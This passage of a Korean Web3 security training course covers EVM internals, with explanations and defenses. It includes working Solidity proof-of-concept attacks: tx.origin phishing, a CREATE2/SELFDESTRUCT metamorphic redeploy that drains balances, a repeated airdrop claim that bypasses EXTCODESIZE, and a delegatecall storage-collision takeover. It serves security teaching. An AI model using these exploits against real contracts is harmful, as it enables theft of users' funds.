# Phase 1: EVM Internals 심화

> Web3 보안 트레이닝 코스 - 3개월 과정 | Phase 1 of 4

---

## 목차

1. [실행 환경 및 Opcode](#1-실행-환경-및-opcode)
   - 1.1 EVM 아키텍처 개요
   - 1.2 CREATE2 메타모픽 공격
   - 1.3 EXTCODESIZE 우회
   - 1.4 delegatecall 컨텍스트
   - 1.5 Yul division by zero
   - 1.6 크로스체인 Opcode 비호환
2. [메모리 & 스토리지 모델](#2-메모리--스토리지-모델)
   - 2.1 스토리지 레이아웃
   - 2.2 스토리지 슬롯 패킹
   - 2.3 커스텀 스토리지 레이아웃 (프록시 패턴)
   - 2.4 low-level call 사일런트 성공
   - 2.5 memory-to-memory 참조 (앨리어싱 버그)
   - 2.6 Transient Storage (EIP-1153)
   - 2.7 Yul/어셈블리 접근 제어 우회
3. [실습 가이드](#3-실습-가이드)
4. [관련 사고 사례](#4-관련-사고-사례)
5. [CTF 연습 문제](#5-ctf-연습-문제)
6. [참고 자료](#6-참고-자료)

---

## 1. 실행 환경 및 Opcode

### 1.1 EVM 아키텍처 개요

#### 스택 기반 가상 머신

EVM(Ethereum Virtual Machine)은 **스택 기반(stack-based)** 가상 머신이다. 레지스터 기반 VM(예: x86, ARM)과 달리 모든 연산은 스택 최상단(top of stack)에서 피연산자를 꺼내고 결과를 다시 스택에 넣는 방식으로 이루어진다.

```
스택 기반 VM 연산 예시: 3 + 5

PUSH 3     스택: [3]
PUSH 5     스택: [3, 5]
ADD        스택: [8]   ← 3과 5를 pop하여 더한 후 8을 push
```

핵심 특성:
- **워드 크기: 256비트 (32바이트)**. 이더리움의 모든 기본 연산 단위는 32바이트다. 주소(20바이트)나 bool(1바이트)도 스택에서는 32바이트로 패딩된다.
- **스택 최대 깊이: 1024**. `CALL` 체인이 1024개를 초과하면 실행이 실패한다 (Call Depth Attack의 근원).
- **결정론적 실행**: 동일한 상태에서 동일한 입력은 항상 동일한 출력을 낸다.

```
EVM 실행 모델 다이어그램
┌─────────────────────────────────────────────────────────────┐
│                        EVM World State                       │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ Account A│  │ Account B│  │ Account C│  │   EOA    │    │
│  │ code     │  │ code     │  │ code     │  │ balance  │    │
│  │ storage  │  │ storage  │  │ storage  │  │ nonce    │    │
│  │ balance  │  │ balance  │  │ balance  │  └──────────┘    │
│  └──────────┘  └──────────┘  └──────────┘                  │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    EVM 실행 컨텍스트                          │
│                                                             │
│  Stack (최대 1024 항목, 각 256-bit)                          │
│  ┌──────────────┐                                           │
│  │  item[1023]  │ ← top (현재 연산 대상)                     │
│  │  item[1022]  │                                           │
│  │     ...      │                                           │
│  │   item[0]    │                                           │
│  └──────────────┘                                           │
│                                                             │
│  Memory (바이트 배열, 실행 중 동적 확장)                       │
│  ┌─────────────────────────────────────────┐                │
│  │ 0x00  0x01  0x02  ...  0x3f  0x40  ... │                │
│  └─────────────────────────────────────────┘                │
│                                                             │
│  Storage (영구 키-값 저장소, 256bit → 256bit)                 │
│  ┌───────────────┬───────────────┐                          │
│  │     Key       │     Value     │                          │
│  │  slot[0]      │   0x1234...   │                          │
│  │  slot[1]      │   0xabcd...   │                          │
│  └───────────────┴───────────────┘                          │
└─────────────────────────────────────────────────────────────┘
```

#### 실행 컨텍스트 변수

트랜잭션/메시지 콜이 시작될 때 EVM은 다음 컨텍스트 변수를 설정한다.

| 변수 | Opcode | 설명 |
|------|--------|------|
| `msg.sender` | `CALLER` | 현재 호출자의 주소 (20바이트) |
| `msg.value` | `CALLVALUE` | 이 호출로 전송된 ETH (wei 단위) |
| `msg.data` | `CALLDATALOAD` / `CALLDATASIZE` | 호출 데이터 (calldata) |
| `tx.origin` | `ORIGIN` | 트랜잭션을 시작한 EOA 주소 |
| `block.number` | `NUMBER` | 현재 블록 번호 |
| `block.timestamp` | `TIMESTAMP` | 현재 블록 타임스탬프 |
| `block.basefee` | `BASEFEE` | EIP-1559 기본 수수료 |
| `address(this)` | `ADDRESS` | 현재 실행 중인 컨트랙트 주소 |

**중요한 구분: `msg.sender` vs `tx.origin`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 시나리오: EOA -> ContractA -> ContractB 호출 체인
contract ContractB {
    function whoCalledMe() external view returns (address caller, address origin) {
        caller = msg.sender;  // ContractA의 주소
        origin = tx.origin;   // EOA의 주소
        // caller != origin (체인 호출 시)
    }
}

// tx.origin을 인증에 사용하면 피싱 공격에 취약
contract VulnerableWallet {
    address owner;

    // 취약: tx.origin 사용
    function transfer(address payable to, uint256 amount) external {
        require(tx.origin == owner, "Not owner");  // 위험!
        to.transfer(amount);
    }
}

// 공격: 악성 컨트랙트가 owner를 속여 호출하게 만들면
// tx.origin == owner가 되어 자금 탈취 가능
contract PhishingAttack {
    VulnerableWallet target;

    // owner가 이 함수를 호출하도록 유도
    function attack() external {
        target.transfer(payable(address(this)), address(target).balance);
        // tx.origin은 owner이므로 통과!
    }
}
```

---

### 1.2 CREATE2 메타모픽 공격

#### CREATE2 주소 결정 공식

`CREATE2` opcode는 **배포 전에 컨트랙트 주소를 계산할 수 있게** 해준다. 주소는 다음 공식으로 결정된다:

```
address = keccak256(0xff ++ deployer_address ++ salt ++ keccak256(initCode))[12:]
```

| 구성 요소 | 크기 | 설명 |
|-----------|------|------|
| `0xff` | 1 byte | CREATE2 구분자 (CREATE와 충돌 방지) |
| `deployer_address` | 20 bytes | CREATE2를 호출하는 컨트랙트 주소 |
| `salt` | 32 bytes | 임의의 32바이트 값 |
| `keccak256(initCode)` | 32 bytes | 배포 바이트코드의 해시 |

주소의 결정 인자는 `initCode`의 해시이므로, **initCode가 다르면 같은 salt로도 같은 주소를 재사용할 수 없다**. 단, `SELFDESTRUCT`로 컨트랙트를 소멸시킨 뒤 동일한 `initCode`로 재배포하면 같은 주소에 올라간다. 이것이 메타모픽 패턴의 핵심이다.

#### 메타모픽 컨트랙트 메커니즘

메타모픽(metamorphic) 컨트랙트는 동일 주소에 **다른 런타임 바이트코드**를 재배포할 수 있다. 이를 가능하게 하는 핵심 트릭:

1. Factory가 CREATE2로 Metamorphic Proxy 배포 (initCode가 항상 동일)
2. Metamorphic Proxy의 생성자가 외부 위치에서 실제 런타임 코드를 가져와 배포
3. SELFDESTRUCT로 컨트랙트 소멸
4. Factory가 동일한 salt로 CREATE2 재배포 → 같은 주소에 새 코드

```
메타모픽 공격 흐름도

1단계: 정상 코드 배포 (신뢰 획득)
┌─────────┐   CREATE2(salt=S, initCode=I)   ┌─────────────────┐
│ Factory │ ────────────────────────────────→ │  0xABCD...      │
│         │                                  │  (정상 로직)     │
└─────────┘                                  └─────────────────┘
                  감사(audit) 및 신뢰 획득 ↑

2단계: 악성 코드 준비
┌─────────┐   setNextCode(maliciousCode)     ┌────────────────────┐
│ Factory │ ────────────────────────────────→ │  임시 저장소        │
│         │                                  │  maliciousCode 보관 │
└─────────┘                                  └────────────────────┘

3단계: SELFDESTRUCT
                        ┌────────────────────┐
                        │  0xABCD...         │
                        │  selfdestruct() →  │ (소멸)
                        └────────────────────┘

4단계: 악성 코드 재배포 (같은 주소!)
┌─────────┐   CREATE2(salt=S, initCode=I)   ┌─────────────────┐
│ Factory │ ────────────────────────────────→ │  0xABCD...      │
│         │   (동일한 salt와 initCode!)       │  (악성 로직)    │
└─────────┘                                  └─────────────────┘
```

#### PoC 코드 (Solidity)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================
// 파일: MetamorphicAttack.sol
// 목적: CREATE2 + SELFDESTRUCT를 이용한 메타모픽 공격 PoC
// ============================================================

// 1. 다음 배포에 사용할 런타임 코드를 저장하는 저장소
contract CodeStorage {
    bytes public storedCode;

    function setCode(bytes calldata code) external {
        storedCode = code;
    }
}

// 2. 메타모픽 프록시 - initCode는 항상 동일
//    생성자에서 CodeStorage로부터 실제 코드를 가져와 RETURN
//    (이것이 트릭: initCode는 같지만 런타임 코드는 다를 수 있다)
contract MetamorphicProxy {
    constructor(address codeStorage) {
        bytes memory code = CodeStorage(codeStorage).storedCode();
        assembly {
            // code 배열의 실제 데이터 위치는 code + 32 (길이 필드 건너뜀)
            return(add(code, 0x20), mload(code))
        }
    }
}

// 3. 악의적인 Factory
contract MetamorphicFactory {
    CodeStorage public codeStorage;
    bytes32 public constant SALT = bytes32(uint256(0x1337));

    constructor() {
        codeStorage = new CodeStorage();
    }

    // MetamorphicProxy의 initCode는 항상 동일 (codeStorage 주소만 다를 경우 주의)
    function _initCode() internal view returns (bytes memory) {
        return abi.encodePacked(
            type(MetamorphicProxy).creationCode,
            abi.encode(address(codeStorage))
        );
    }

    // 주소 사전 계산
    function computeAddress() external view returns (address) {
        bytes memory initCode = _initCode();
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            SALT,
            keccak256(initCode)
        )))));
    }

    // 배포
    function deploy(bytes calldata runtimeCode) external returns (address deployed) {
        codeStorage.setCode(runtimeCode);
        bytes memory initCode = _initCode();
        assembly {
            deployed := create2(0, add(initCode, 0x20), mload(initCode), sload(SALT.slot))
        }
        require(deployed != address(0), "Deploy failed");
    }
}

// ============================================================
// 공격 시나리오
// ============================================================

// 정상 버전: 단순 토큰 전송 로직
contract LegitLogic {
    address public owner;

    constructor() { owner = msg.sender; }

    function transfer(address to, uint256 amount) external {
        // 정상적인 전송 로직
    }
}

// 악성 버전: 모든 잔고 탈취
contract MaliciousLogic {
    address public attacker = 0x1234567890123456789012345678901234567890;

    function transfer(address, uint256) external {
        // 실제로는 attacker에게 전송
        payable(attacker).transfer(address(this).balance);
    }

    // SELFDESTRUCT 트리거
    function destroy() external {
        selfdestruct(payable(attacker));
    }
}
```

```solidity
// ============================================================
// 파일: MetamorphicAttack.t.sol (Foundry 테스트)
// ============================================================
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./MetamorphicAttack.sol";

contract MetamorphicTest is Test {
    MetamorphicFactory factory;

    function setUp() public {
        factory = new MetamorphicFactory();
    }

    function testMetamorphicAttack() public {
        // Step 1: 정상 코드 배포
        bytes memory legitCode = type(LegitLogic).runtimeCode;
        address deployed = factory.deploy(legitCode);

        console.log("Deployed address:", deployed);
        console.log("Precomputed address:", factory.computeAddress());
        assertEq(deployed, factory.computeAddress());

        // Step 2: 감사 통과 후, SELFDESTRUCT
        // (실제 공격에서는 거버넌스 제안 등을 통해 수행)
        MaliciousLogic(deployed).destroy();

        // Step 3: 같은 주소에 악성 코드 재배포
        bytes memory maliciousCode = type(MaliciousLogic).runtimeCode;
        address redeployed = factory.deploy(maliciousCode);

        assertEq(deployed, redeployed, "Same address, different code!");
        console.log("Redeployed at same address with malicious code");
    }
}
```

#### 방어: EIP-6780 (Dencun 업그레이드 이후)

2024년 3월 Dencun 업그레이드에서 적용된 **EIP-6780**은 `SELFDESTRUCT`의 동작을 크게 제한한다.

**EIP-6780 이전 (구 동작)**:
- `SELFDESTRUCT`는 언제든지 컨트랙트 코드와 스토리지를 삭제하고 ETH를 전송

**EIP-6780 이후 (새 동작)**:
- `SELFDESTRUCT`는 **동일 트랜잭션 내에서 생성된 컨트랙트**에 대해서만 완전 소멸 동작
- 이미 존재하는 컨트랙트에서 `SELFDESTRUCT` 호출 시: ETH만 전송되고 코드/스토리지는 유지됨

```solidity
// EIP-6780 이후 메타모픽 공격의 무력화
contract PostDencunDeployment {
    // 이미 존재하는 컨트랙트에서의 SELFDESTRUCT는
    // 이제 코드를 삭제하지 않는다 → 재배포 불가능
    function tryDestroy() external {
        selfdestruct(payable(msg.sender));
        // EIP-6780 이후: ETH만 전송, 코드는 유지
        // 따라서 CREATE2로 같은 주소에 재배포 시도 → 실패
    }
}
```

**추가 방어 전략**:
1. 컨트랙트 주소 자체를 신뢰 앵커로 사용하지 말고 별도 검증 메커니즘 사용
2. 코드 해시(`address.codehash`)를 저장하고 변경 감지
3. 불변 프록시 패턴 (UUPS 없이 배포) 사용

---

### 1.3 EXTCODESIZE 우회

#### 생성자 실행 중 코드 크기

EVM에서 컨트랙트 생성(배포) 과정은 두 단계로 나뉜다:

1. **initCode 실행 단계**: 생성자 코드가 실행됨. 이 시점에서 해당 주소의 런타임 코드는 아직 없음 → `EXTCODESIZE == 0`
2. **런타임 코드 저장 단계**: initCode가 반환한 바이트코드가 해당 주소에 저장됨

이를 이용하면 `isContract()` 체크를 우회할 수 있다.

```
컨트랙트 배포 생명주기

트랜잭션 수신
     │
     ▼
새 주소 계산 (CREATE 또는 CREATE2)
     │
     ▼
┌────────────────────────────────────┐
│  initCode 실행 (생성자 코드)        │  ← 이 시점: EXTCODESIZE(newAddr) == 0
│  - 이 시점에서 이미 msg.sender로    │
│    호출 가능                        │
│  - 공격 컨트랙트는 생성자에서       │
│    피해 컨트랙트 호출 가능          │
└────────────────────────────────────┘
     │
     ▼ (initCode가 런타임 바이트코드 반환)
런타임 코드 저장 → EXTCODESIZE > 0
     │
     ▼
배포 완료
```

#### isContract() 체크 우회 PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================
// 취약한 컨트랙트: EXTCODESIZE로 EOA/컨트랙트 구분 시도
// ============================================================
contract VulnerableAirdrop {
    mapping(address => bool) public claimed;

    // 취약: EXTCODESIZE == 0이면 EOA로 간주
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // "EOA만" 에어드롭 받을 수 있도록 의도했으나 취약
    function claimAirdrop() external {
        require(!isContract(msg.sender), "Contracts not allowed");
        require(!claimed[msg.sender], "Already claimed");
        claimed[msg.sender] = true;
        // 에어드롭 토큰 전송 (생략)
        // token.transfer(msg.sender, 100 ether);
    }
}

// ============================================================
// 공격 컨트랙트: 생성자에서 claimAirdrop 호출
// ============================================================
contract AirdropAttacker {
    constructor(address airdrop) {
        // 생성자 실행 중이므로 address(this)의 EXTCODESIZE == 0
        // isContract(address(this)) → false → 체크 우회!
        VulnerableAirdrop(airdrop).claimAirdrop();
    }
}

// ============================================================
// 공격 실행기: 여러 번 에어드롭 청구
// ============================================================
contract AirdropExploiter {
    function exploit(address airdrop, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            // 매번 새 컨트랙트를 생성 → 새 주소 → 새 청구 가능
            new AirdropAttacker(airdrop);
        }
    }
}
```

#### 방어 방법

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SecureAirdrop {
    mapping(address => bool) public claimed;

    // 방어 1: tx.origin과 msg.sender 비교
    // (tx.origin 사용은 다른 취약점을 만들 수 있으므로 주의)
    modifier onlyEOA() {
        require(tx.origin == msg.sender, "No contracts");
        _;
    }

    // 방어 2: 화이트리스트 + 머클 증명 방식
    // (특정 주소만 청구 가능하도록 사전 등록)

    // 방어 3: 청구 지연 (EIP-1153 Transient Storage 활용)
    // 생성자에서는 청구를 등록만 하고, 별도 트랜잭션으로 실행

    function claimAirdrop() external onlyEOA {
        require(!claimed[msg.sender], "Already claimed");
        claimed[msg.sender] = true;
        // token.transfer(msg.sender, 100 ether);
    }
}
```

**주의사항**:
- `tx.origin == msg.sender` 체크도 완벽하지 않다. 향후 계정 추상화(EIP-4337)에서는 이 패턴이 깨질 수 있다.
- 근본적인 해결책은 **어떤 주소가 컨트랙트인지로 권한을 구분하지 않는 것**이다. 비즈니스 로직으로 제어해야 한다.

---

### 1.4 delegatecall 컨텍스트

#### delegatecall 동작 원리

`delegatecall`은 `call`과 유사하지만, **호출받은 코드가 호출자의 컨텍스트(스토리지, msg.sender, msg.value)에서 실행**된다.

```
CALL vs DELEGATECALL 비교

CALL:
┌─────────────────────┐         ┌─────────────────────┐
│  Contract A (caller) │  CALL  │  Contract B (callee) │
│  storage: A's        │ ──────→ │  storage: B's        │
│  msg.sender: A       │         │  msg.sender: A       │
│  msg.value: 0        │         │  코드: B's 코드       │
└─────────────────────┘         └─────────────────────┘

DELEGATECALL:
┌─────────────────────┐   DELEGATECALL   ┌─────────────────────┐
│  Contract A (caller) │ ──────────────→  │  Contract B (logic) │
│  storage: A's ← 여기서 실행됨!         │  코드: B's 코드       │
│  msg.sender: 원래 호출자               │  (이 코드가 A의       │
│  msg.value: 원래 값                    │   컨텍스트에서 동작)  │
└─────────────────────┘                  └─────────────────────┘
```

핵심 보안 특성:
- **스토리지**: callee의 코드가 **caller의 스토리지 슬롯**을 읽고 씀
- **msg.sender**: delegatecall에서는 원래 호출자가 유지됨
- **msg.value**: 원래 전송된 ETH 값이 유지됨
- **address(this)**: caller의 주소 (B의 주소가 아님)

#### 스토리지 슬롯 충돌 위험

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================
// 스토리지 슬롯 충돌 예시
// ============================================================

// 로직 컨트랙트 (implementation)
contract LogicV1 {
    // slot 0: owner
    address public owner;
    // slot 1: value
    uint256 public value;

    function setValue(uint256 _value) external {
        value = _value;  // slot 1에 씀
    }
}

// 프록시 컨트랙트 (취약한 버전)
contract VulnerableProxy {
    // slot 0: implementation 주소
    address public implementation;
    // slot 1: admin 주소
    address public admin;

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

```
스토리지 슬롯 충돌 시각화:

VulnerableProxy의 스토리지 레이아웃:
┌─────────┬────────────────────────────┐
│  Slot 0 │  implementation (address)  │
│  Slot 1 │  admin (address)           │
└─────────┴────────────────────────────┘

LogicV1의 스토리지 레이아웃:
┌─────────┬────────────────────────────┐
│  Slot 0 │  owner (address)           │  ← 충돌!
│  Slot 1 │  value (uint256)           │  ← 충돌!
└─────────┴────────────────────────────┘

LogicV1.setValue(newValue) 호출 시:
Proxy의 slot 1 (admin 주소!)에 newValue를 씀 → admin 덮어쓰기!
```

#### PoC: delegatecall로 owner 덮어쓰기

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 이 패턴은 Parity Wallet 해킹 사건의 간소화된 버전

// 로직 컨트랙트
contract WalletLogic {
    address public owner;       // slot 0

    function initWallet(address _owner) external {
        owner = _owner;         // slot 0에 씀
    }

    function transferFunds(address payable to, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        to.transfer(amount);
    }
}

// 프록시 (멀티시그 지갑 역할)
contract WalletProxy {
    address public implementation;  // slot 0 ← WalletLogic.owner와 충돌!
    address public admin;           // slot 1

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    // 중요: initWallet이 호출 제한 없이 public이면 누구나 owner 설정 가능
    fallback() external payable {
        (bool success,) = implementation.delegatecall(msg.data);
        require(success);
    }
}

// 공격자
contract WalletAttacker {
    function attack(address proxy, address logic) external {
        // delegatecall 실행: WalletLogic.initWallet이 Proxy의 slot 0에 씀
        // slot 0 = implementation 주소 → 덮어쓰기!
        // 공격자가 owner(실제로는 implementation 슬롯)를 자신으로 설정
        WalletProxy(payable(proxy)).call(
            abi.encodeWithSignature("initWallet(address)", address(this))
        );
        // 이제 공격자가 owner → transferFunds 호출 가능
        WalletProxy(payable(proxy)).call(
            abi.encodeWithSignature(
                "transferFunds(address,uint256)",
                address(this),
                address(proxy).balance
            )
        );
    }
}
```

#### 방어: EIP-1967 표준 슬롯

```solidity
// EIP-1967: 충돌 가능성이 극히 낮은 슬롯 사용
// implementation 슬롯:
// bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)
// = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

contract EIP1967Proxy {
    // EIP-1967 정의 슬롯 (일반 변수 선언 없음!)
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    function _getImplementation() internal view returns (address impl) {
        assembly {
            impl := sload(IMPLEMENTATION_SLOT)
        }
    }

    function _setImplementation(address newImpl) internal {
        assembly {
            sstore(IMPLEMENTATION_SLOT, newImpl)
        }
    }

    fallback() external payable {
        address impl = _getImplementation();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

---

### 1.5 Yul division by zero

#### Solidity vs Yul의 0 나눗셈 처리 차이

Solidity는 `SafeMath` 없이도 0으로 나누면 자동으로 revert한다. 하지만 인라인 어셈블리(Yul)에서는 이 보호가 없다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DivisionComparison {
    // Solidity: 0 나눗셈 시 Panic(0x12) 에러로 revert
    function solidityDiv(uint256 a, uint256 b) external pure returns (uint256) {
        return a / b;  // b == 0이면 revert with Panic code 0x12
    }

    // Yul: 0 나눗셈 시 조용히 0 반환 (EVM DIV opcode 스펙)
    function yulDiv(uint256 a, uint256 b) external pure returns (uint256 result) {
        assembly {
            result := div(a, b)  // b == 0이면 result = 0 (revert 없음!)
        }
    }

    // 서명 나눗셈도 동일
    function yulSDiv(int256 a, int256 b) external pure returns (int256 result) {
        assembly {
            result := sdiv(a, b)  // b == 0이면 result = 0
        }
    }

    // 모듈로 연산도 동일
    function yulMod(uint256 a, uint256 b) external pure returns (uint256 result) {
        assembly {
            result := mod(a, b)  // b == 0이면 result = 0
        }
    }
}
```

#### 보안 영향 및 취약한 패턴

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 취약: Yul div를 사용한 보상 분배 계산
contract VulnerableRewardDistributor {
    uint256 public totalRewards;
    uint256 public participantCount;

    function setParticipants(uint256 count) external {
        participantCount = count;
    }

    // 취약: participantCount가 0이면 rewardPerUser = 0이 되고
    // 아무도 0 보상을 받지 못하는 상황 발생
    // (revert 없이 조용히 잘못된 계산 수행)
    function calculateReward() external view returns (uint256 rewardPerUser) {
        assembly {
            let total := sload(totalRewards.slot)
            let count := sload(participantCount.slot)
            rewardPerUser := div(total, count)  // count == 0이면 0 반환!
        }
        // rewardPerUser == 0이면 조건 체크 없이 계속 진행 → 보상 분배 실패
    }

    // 더 심각한 예: 가격 계산에서의 0 나눗셈
    function getTokenPrice(
        uint256 totalValue,
        uint256 totalSupply
    ) external pure returns (uint256 price) {
        assembly {
            // totalSupply == 0이면 price == 0
            // 이 결과를 사용하는 로직이 0 가격으로 계산될 수 있음
            price := div(totalValue, totalSupply)
        }
    }
}

// 안전한 버전
contract SafeYulMath {
    function safeDiv(uint256 a, uint256 b) external pure returns (uint256 result) {
        assembly {
            // 명시적 0 체크
            if iszero(b) {
                // revert with "Division by zero" 메시지
                mstore(0x00, 0x08c379a0)  // Error(string) selector
                mstore(0x04, 0x20)        // offset
                mstore(0x24, 0x12)        // 길이: 18
                mstore(0x44, "Division by zero")
                revert(0x00, 0x64)
            }
            result := div(a, b)
        }
    }

    // 또는 더 간단하게: Yul에서 require 패턴
    function safeDivV2(uint256 a, uint256 b) external pure returns (uint256 result) {
        assembly {
            if iszero(b) { revert(0, 0) }  // 최소한의 revert
            result := div(a, b)
        }
    }
}
```

#### 실제 취약점 패턴: Yul에서의 조용한 실패

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 패턴: AMM 스타일 가격 계산에서의 취약점
contract VulnerableAMM {
    uint256 public reserveA;
    uint256 public reserveB;

    // 취약: 초기화 전 (reserves == 0) 가격 쿼리 시
    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut) {
        assembly {
            let rA := sload(reserveA.slot)
            let rB := sload(reserveB.slot)
            // rA == 0이면 amountOut == 0, revert 없음
            // 호출자는 0을 정상 값으로 오해할 수 있음
            amountOut := div(mul(amountIn, rB), rA)
        }
    }

    // 공격 시나리오:
    // 1. AMM이 초기화되기 전 getAmountOut 호출
    // 2. 반환값 0을 "정상"으로 처리하는 상위 로직이 있다면
    // 3. 0 토큰을 받는 트랜잭션이 실행될 수 있음
}
```

---

### 1.6 크로스체인 Opcode 비호환

#### PUSH0 (EIP-3855) 미지원 체인

`PUSH0`은 **Ethereum Shanghai 업그레이드(2023년 4월)**에서 도입된 opcode로, 스택에 0을 push하는 가장 효율적인 방법이다. 하지만 모든 EVM 호환 체인이 이를 지원하지는 않는다.

```
PUSH0 지원 현황 (2024년 기준):
┌────────────────────┬──────────────┬──────────────────────────────┐
│  체인              │  PUSH0 지원  │  참고                         │
├────────────────────┼──────────────┼──────────────────────────────┤
│  Ethereum (mainnet)│  지원        │  Shanghai 이후                │
│  Polygon PoS       │  지원        │  업데이트됨                   │
│  Arbitrum One      │  지원        │  업데이트됨                   │
│  Optimism          │  지원        │  업데이트됨                   │
│  BSC (BNB Chain)   │  미지원(일부)│  Shanghai 미적용 구버전 노드  │
│  Fantom            │  미지원      │  별도 업그레이드 필요         │
│  Avalanche C-Chain │  지원        │  업데이트됨                   │
└────────────────────┴──────────────┴──────────────────────────────┘
```

```solidity
// Solidity ^0.8.20으로 컴파일하면 PUSH0 opcode 생성 가능
// BSC 같은 미지원 체인에 배포 시 Invalid Opcode 에러 발생

// 해결책: 컴파일러 옵션에서 EVM 버전 지정
// foundry.toml:
// [profile.default]
// evm_version = "paris"  ← Shanghai 이전 버전 지정

// 또는 solc 직접 사용 시:
// solc --evm-version paris MyContract.sol
```

#### PREVRANDAO 차이

`PREVRANDAO` (구 `DIFFICULTY`)는 이더리움 PoS 전환 이후 변경되었다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract RandomnessVulnerability {
    // PoW 시절의 취약한 패턴
    function badRandom_PoW() external view returns (uint256) {
        // block.difficulty는 마이너가 어느 정도 조작 가능했음
        return uint256(keccak256(abi.encodePacked(
            block.difficulty,
            block.timestamp,
            msg.sender
        )));
    }

    // PoS 이후: PREVRANDAO 사용
    // 이론적으로 더 안전하지만 여전히 validators가 reveal을 withhold 가능
    function badRandom_PoS() external view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(
            block.prevrandao,  // 이전 블록의 RANDAO reveal
            block.timestamp,
            msg.sender
        )));
    }

    // 체인별 차이:
    // - PoW 체인 (일부 포크): block.difficulty는 실제 채굴 난이도
    // - PoS Ethereum: block.prevrandao는 RANDAO 값
    // - PoA 체인 (예: 일부 테스트넷): DIFFICULTY/PREVRANDAO == 0 또는 상수
}
```

#### 체인별 프리컴파일 차이

프리컴파일(precompile)은 특정 주소에 배포된 네이티브 구현 컨트랙트다. 체인마다 지원하는 프리컴파일이 다르다.

```
표준 Ethereum 프리컴파일:
┌─────────┬─────────────────────────────────────────────┐
│  주소   │  기능                                        │
├─────────┼─────────────────────────────────────────────┤
│  0x01   │  ecRecover (ECDSA 서명 복구)                 │
│  0x02   │  SHA2-256                                    │
│  0x03   │  RIPEMD-160                                  │
│  0x04   │  identity (데이터 복사)                      │
│  0x05   │  modexp (모듈러 지수)                        │
│  0x06   │  ecAdd (BN254 곡선 덧셈)                     │
│  0x07   │  ecMul (BN254 스칼라 곱셈)                   │
│  0x08   │  ecPairing (BN254 페어링)                    │
│  0x09   │  blake2f                                     │
│  0x0a   │  KZG point evaluation (EIP-4844, Cancun)    │
└─────────┴─────────────────────────────────────────────┘

체인별 추가/차이:
- Arbitrum: 추가 프리컴파일 (0x64 등)
- Optimism: L1Block 정보 프리컴파일
- zkSync: 네이티브 토큰 프리컴파일
- Polygon: 다수의 추가 프리컴파일
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CrossChainPrecompileIssue {
    // 표준 ecRecover는 모든 EVM 호환 체인에서 동작
    function recoverSigner(bytes32 hash, bytes memory sig) external pure returns (address) {
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(sig);
        return ecrecover(hash, v, r, s);
    }

    // BN254 pairing은 일부 체인에서 다른 가스 비용 또는 미구현
    function verifyProof(
        uint256[2] memory a,
        uint256[2][2] memory b,
        uint256[2] memory c
    ) external view returns (bool) {
        // 일부 체인에서 이 호출이 revert되거나 다른 동작을 할 수 있음
        (bool success, bytes memory result) = address(0x08).staticcall(
            abi.encode(a, b, c)
        );
        return success && abi.decode(result, (bool));
    }

    function splitSignature(bytes memory sig)
        internal
        pure
        returns (bytes32 r, bytes32 s, uint8 v)
    {
        require(sig.length == 65, "Invalid sig length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}
```

---

## 2. 메모리 & 스토리지 모델

### 2.1 스토리지 레이아웃

EVM 스토리지는 `uint256 → uint256` 키-값 저장소다. 모든 키는 기본값이 0이다.

#### 고정 크기 변수: 슬롯 순서 배치

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract StorageLayout {
    // slot 0
    uint256 public a;           // 32바이트, slot 0 전체 사용
    // slot 1
    address public b;           // 20바이트, slot 1의 하위 20바이트
    // slot 1 (계속)            // b와 같은 슬롯에 패킹 가능
    uint96 public c;            // 12바이트, slot 1의 남은 공간
    // slot 2
    bool public d;              // 1바이트, slot 2 시작
    uint248 public e;           // 31바이트, slot 2 나머지
    // slot 3
    uint256 public f;           // slot 3
}
```

```
스토리지 레이아웃 시각화:
┌─────────┬────────────────────────────────────────────────────────────────┐
│  Slot   │  바이트 (오른쪽 = 하위, 왼쪽 = 상위)                            │
